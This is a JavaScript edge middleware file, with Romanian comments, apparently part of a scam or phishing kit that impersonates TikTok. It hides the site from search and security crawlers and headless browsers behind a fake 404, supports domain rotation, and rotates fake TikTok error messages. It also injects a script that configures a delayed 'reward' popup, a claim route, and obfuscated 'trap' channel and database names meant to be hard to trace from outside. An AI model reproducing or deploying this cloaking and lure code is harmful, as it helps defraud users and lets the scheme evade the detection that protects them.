// _middleware.js v3 — ID 21 (error message rotation) + ID 25 (STATE_TOKEN injection) + behavioral cloaking
export async function onRequest(context) {
  const { request, next, env } = context;
  const url = new URL(request.url);
  const path = url.pathname;

  // --- Health endpoint (domain rotation) ---
  if (path === '/__health' || path === '/h') {
    return new Response(JSON.stringify({
      ok: true,
      ts: Date.now(),
      ray: request.headers.get('cf-ray') || '',
      country: request.headers.get('cf-ipcountry') || 'XX'
    }), {
      headers: {
        'Content-Type': 'application/json',
        'Cache-Control': 'no-store',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  // --- Pasăm API-urile și funcțiile direct ---
  if (path.startsWith('/api/') || path.startsWith('/c') || path.startsWith('/e') || path.startsWith('/v')) {
    return next();
  }

  // === BEHAVIORAL CLOAKING ===
  const ua = request.headers.get('user-agent') || '';
  const secFetchSite = request.headers.get('sec-fetch-site') || '';
  const secFetchMode = request.headers.get('sec-fetch-mode') || '';
  const secFetchDest = request.headers.get('sec-fetch-dest') || '';
  const acceptLang  = request.headers.get('accept-language') || '';
  const accept      = request.headers.get('accept') || '';

  // Detectăm crawlers/bots cunoscuți
  const isCrawler = /googlebot|bingbot|yandexbot|duckduckbot|slurp|baidu|sogou|exabot|facebot|ia_archiver|semrushbot|ahrefsbot|mj12bot|dotbot|blexbot|petalbot|bytespider/i.test(ua);
  const isHeadless = /headlesschrome|phantomjs|selenium|webdriver|puppeteer/i.test(ua);

  if (isCrawler || isHeadless) {
    return generateBlockedResponse(request, 'bot_detected');
  }

  // === GEO + SEC-FETCH + LANG CLOAKING — toate dezactivate ===
  const country = request.headers.get('cf-ipcountry') || 'XX';

  // === GENERĂM STATE TOKEN (ID 25) ===
  const uid = generateUID(request);
  const ts  = Date.now();
  let stateToken = '';
  if (env.STATE_SECRET) {
    try {
      stateToken = await generateHMAC(uid + ':' + ts, env.STATE_SECRET);
    } catch(e) {
      stateToken = '';
    }
  } else {
    // fallback simplu dacă nu e setat secretul
    stateToken = btoa(uid + ':' + ts).replace(/=/g, '');
  }

  // === ID 21 — ERROR MESSAGE ROTATION ===
  const errorMessages = [
    { title: 'Something went wrong', sub: 'This content could not be loaded. Please try again.' },
    { title: 'Connection Error',     sub: 'Failed to load page. Check your connection and retry.' },
    { title: 'Loading Failed',       sub: 'Content unavailable right now. Pull down to refresh.' },
    { title: 'Network Problem',      sub: 'TikTok could not load this page. Try again shortly.' },
    { title: 'Oops!',                sub: 'Something interrupted your experience. Tap to reload.' },
    { title: 'Page Unavailable',     sub: 'This page is temporarily unavailable. Please wait.' },
    { title: 'Request Timeout',      sub: 'The request took too long. Check your signal strength.' }
  ];
  const errIdx = Math.floor(Math.random() * errorMessages.length);
  const chosenError = errorMessages[errIdx];

  // === SKIN + DELAY — fix pentru toti userii ===
  const isMobile  = /android|iphone|ipad|mobile/i.test(ua);
  const isAndroid = /android/i.test(ua);
  const isIOS     = /iphone|ipad/i.test(ua);

  const chosenSkin  = 'skin-reward';
  const chosenDelay = 20000; // 20s fix pentru toata lumea

  const abVariant = 0;
  const abDelay   = chosenDelay;

  // === CHANNEL SEED (obfuscare BroadcastChannel + IndexedDB names) ===
  // seed = primele 8 chars din uid → channel names unice per user, ireproductibile din exterior
  const chSeed = uid.slice(0, 8);
  const chMain = 'ch_' + chSeed;           // înlocuiește 'trap_ch'
  const chHb   = 'hb_' + chSeed;           // înlocuiește 'trap_sw_hb'
  const dbName = 'db_' + chSeed;           // înlocuiește 'trap_db'

  // === SERVE & INJECT ===
  const response = await next();

  // Injectăm doar în HTML
  const contentType = response.headers.get('content-type') || '';
  if (!contentType.includes('text/html')) {
    return response;
  }

  const original = await response.text();

  // Injection script: variabile globale + CONFIG
  const injection = `
<script>
(function(){
  window.__GEO_COUNTRY  = ${JSON.stringify(country)};
  window.__SERVER_TS    = ${ts};
  window.__RAY          = ${JSON.stringify(request.headers.get('cf-ray') || '')};
  window.__STATE_TOKEN  = ${JSON.stringify(stateToken)};
  window.__STATE_UID    = ${JSON.stringify(uid)};
  window.__ERROR_TITLE  = ${JSON.stringify(chosenError.title)};
  window.__ERROR_SUB    = ${JSON.stringify(chosenError.sub)};
  window.__ab           = { variantIndex: ${abVariant}, delay: ${abDelay}, skin: ${JSON.stringify(chosenSkin)} };
  window.__CONFIG       = {
    POPUP_DELAY_MS:      ${abDelay},
    POPUP_COUNTDOWN_S:   300,
    POPUP_SKIN:          ${JSON.stringify(chosenSkin)},
    CLAIM_ROUTE:         '/c',
    HEALTH_ROUTE:        '/h',
    EVENT_ROUTE:         '/e',
    VISIT_ROUTE:         '/v',
    BROADCAST_CHANNEL:   ${JSON.stringify(chMain)},
    HB_CHANNEL:          ${JSON.stringify(chHb)},
    DB_NAME:             ${JSON.stringify(dbName)}
  };
})();
</script>`;

  // Înlocuim mesajul de eroare în HTML dacă există placeholder (ID 21)
  let rewritten = original
    .replace('__ERROR_TITLE__', chosenError.title)
    .replace('__ERROR_SUB__', chosenError.sub)
    .replace('</head>', injection + '\n</head>');

  // Dacă nu există </head>, injectăm la start
  if (!rewritten.includes(injection)) {
    rewritten = injection + rewritten;
  }

  const headers = new Headers(response.headers);
  headers.set('Content-Type', 'text/html; charset=utf-8');
  headers.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  headers.delete('ETag');

  return new Response(rewritten, {
    status: response.status,
    headers
  });
}

// --- Helpers ---

function generateBlockedResponse(request, reason) {
  // Pagină goală / 404 — nu revelez blocarea
  const isHtml = (request.headers.get('accept') || '').includes('text/html');
  if (isHtml) {
    return new Response('<!DOCTYPE html><html><head><title>Not Found</title></head><body><h1>404 Not Found</h1></body></html>', {
      status: 404,
      headers: { 'Content-Type': 'text/html' }
    });
  }
  return new Response('Not Found', { status: 404 });
}

function generateUID(request) {
  const ip  = request.headers.get('cf-connecting-ip') || '';
  const ua  = request.headers.get('user-agent') || '';
  const ray = request.headers.get('cf-ray') || String(Date.now());
  // UID deterministă per request (nu per sesiune — nu avem cookie în middleware fără KV)
  return btoa(ip + '|' + ua.slice(0, 32) + '|' + ray).replace(/[^a-zA-Z0-9]/g, '').slice(0, 32);
}

function simpleHash(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) {
    h = (Math.imul(31, h) + str.charCodeAt(i)) | 0;
  }
  return Math.abs(h);
}

async function generateHMAC(message, secret) {
  const enc     = new TextEncoder();
  const keyData = enc.encode(secret);
  const msgData = enc.encode(message);
  const key = await crypto.subtle.importKey(
    'raw', keyData,
    { name: 'HMAC', hash: 'SHA-256' },
    false, ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, msgData);
  return Array.from(new Uint8Array(sig))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}
